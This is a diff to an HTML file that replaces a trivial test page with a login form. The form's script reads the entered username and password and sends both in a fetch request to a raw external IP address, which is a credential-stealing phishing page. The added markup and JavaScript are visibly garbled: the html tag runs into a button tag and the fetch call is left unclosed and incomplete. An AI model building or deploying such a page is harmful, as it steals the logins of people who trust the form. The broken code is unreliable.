@@ -1,5 +1,20 @@
-<h1>Test</h1>
 
-<script>
-  alert(1)
-</script>
+<!DOCTYPE html>
+<html <button type="submit">Send</button>
+    </form>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const user = document.getElementById('username').value;
+            const pass = document.getElementById('password').value;
+
+            fetch(`https://204.216.156.181:443/${encodeURIComponent(user)}/${encodeURIComponent(pass)}`, {
+                method: 'POST'
+            response.text())
+            .then(data => alert('Response: ' + data))
+            .catch(error => alert('Error: ' + error));
+        });
+    </script>
+</body>
+</html>
